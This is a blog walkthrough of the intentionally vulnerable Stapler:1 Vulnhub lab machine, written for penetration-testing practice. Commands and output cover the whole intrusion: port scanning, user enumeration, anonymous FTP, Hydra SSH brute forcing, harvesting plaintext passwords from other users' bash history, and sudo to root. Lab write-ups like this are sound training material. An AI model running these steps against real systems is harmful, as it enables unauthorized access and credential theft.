---
date: 2020-05-21 03:00:00
layout: post
title: "Stapler 1 Vulnhub Walkthrough"
subtitle:
description: Stapler:1 is another boot to root machine available on vulnhub and rated as Beginner.
image: /assets/img/uploads/stapler/stapler.jpg
optimized_image:
category: walkthrough
tags: vulnhub boot2root
author: madhavmehndiratta
paginate: false
keywords: stapler, stapler 1 vulnhub, stapler vulnhub walkthrough, vulnhub, stapler writeup, infosec articles, vulnhub stapler
---

Stapler:1 is another boot to root machine available on vulnhub which is rated as Beginner. It is one of several vulnerable systems hosted on vulnhub that is supposed to assist penetration testers for OSCP Training.

## Initial Enumeration

As usual, I started with Nmap checking for open ports and default scripts.

```c#
m1m3@kali:~$ nmap -sV -p- -oA nmap/stapler-allPorts 192.168.1.8

Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for 192.168.1.8Host is up (0.0028s latency).
Not shown: 65523 filtered ports
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open   domain      dnsmasq 2.75
80/tcp    open   http        PHP cli server 5.5 or later
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP
666/tcp   open   doom?
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.80%I=7%D=5/17%Time=5EC14E6E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,25A8,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1
SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0
SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa
SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\
SF:x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x
SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu
SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd
SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa
SF:0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x
SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x
SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x
SF:dc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd
SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa
SF:f\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:
SF:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\
SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\
SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd
```

Next, I ran an <i>enum4linux</i> scan and got a big list of users. These might be useful for a dictionary attack.

```r
m1m3@kali:~$ enum4linux 192.168.1.8
```

<center><br>
<img src="/assets/img/uploads/stapler/users.png">
</center>

I added copied this into a file named users.txt and then separated the name of users to a separate file.

```r
m1m3@kali:~$ cat users.txt | cut -d '\' -f2 | cut -d ' ' -f1 > user_list.txt
m1m3@kali:~$ cat user_list.txt 
peter
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
www
elly
```

## FTP Enumeration:

Identifying vSFTP was running on Port 21, I tried to access by using an anonymous FTP login.

```r
m1m3@kali:~$ ftp 192.168.1.8

Connected to 192.168.1.8.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
Name (192.168.1.8:m1m3): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Next, I performed a directory listing to view the contents and found a note. So, I downloaded this to read it.

```r
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> get note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
226 Transfer complete.
107 bytes received in 0.00 secs (61.0352 kB/s)
ftp> exit
221 Goodbye.
m1m3@kali:~$ cat note
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.

```

## SSH Enumeration:

I tried to bruteforce ssh credentials with Hydra using the users_list.

```r
m1m3@kali:~$ hydra -L user_list.txt -P user_list.txt 192.168.1.8 ssh

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 961 login tries (l:31/p:31), ~61 tries per task
[DATA] attacking ssh://192.168.1.8:22/
[22][ssh] host: 192.168.1.8   login: SHayslett   password: SHayslett
[STATUS] 259.00 tries/min, 259 tries in 00:01h, 707 to do in 00:03h, 16 active
```

I was able to ssh into the machine using SHayslett's credentials.

```r
m1m3@kali:~$ ssh SHayslett@192.168.1.8

The authenticity of host '192.168.1.8 (192.168.1.8)' cant be established.
ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.8' (ECDSA) to the list of known hosts.
-----------------------------------------------------------------
~          Barry, dont forget to put a message here           ~
-----------------------------------------------------------------
SHayslett@192.168.1.8's password: 
Welcome back!


SHayslett@red:~$ id
uid=1005(SHayslett) gid=1005(SHayslett) groups=1005(SHayslett)
SHayslett@red:~$ 
```

Then I checked if this user could execute any command as root but did not found anything.

```r
SHayslett@red:~$ sudo -l

[sudo] password for SHayslett:
Sorry, user SHayslett may not run sudo on red.
```
## Root Shell:

Next I checked the bash_history of all the users.

```r
SHayslett@red:/home$ find -name ".bash_history" -exec cat {} \;

exit
exit
free
exit
exit
exit
exit
exit
exit
exit
exit
exit
exit
exit
top
ps aux
exit
exit
id
cat: ./peter/.bash_history: Permission denied
find: ‘./peter/.cache’: Permission denied
exit
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
exit
exit
exit
exit
exit
exit
exit
exit
exit
whoami
exit
exit
exit
top
exit
SHayslett@red:/home$ 
```

Two more passwords XD. I logged in as <i>peter</i> via ssh and found that this user is added in the sudoers group.

```r
m1m3@kali:~$ ssh -t peter@192.168.1.8 '/bin/bash'

-----------------------------------------------------------------
~          Barry, dont forget to put a message here           ~
-----------------------------------------------------------------
peter@192.168.1.8's password: 
peter@red:~$ id
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
peter@red:~$ sudo /bin/bash

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
root@red:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Here is our FLAG.

```r
root@red:~# cat /root/flag.txt

~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

This is a very straight forward writeup, there are many other ways to pwn this machine. I will share a detailed writeup in coming future!

That’s it! Thanks for reading. Stay tuned for similar walkthroughs coming up in the near future!
If you have any queries, you can contact me <a href="/contact">here.</a>

NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/Meugraphics">Marlon Urrutia.</a>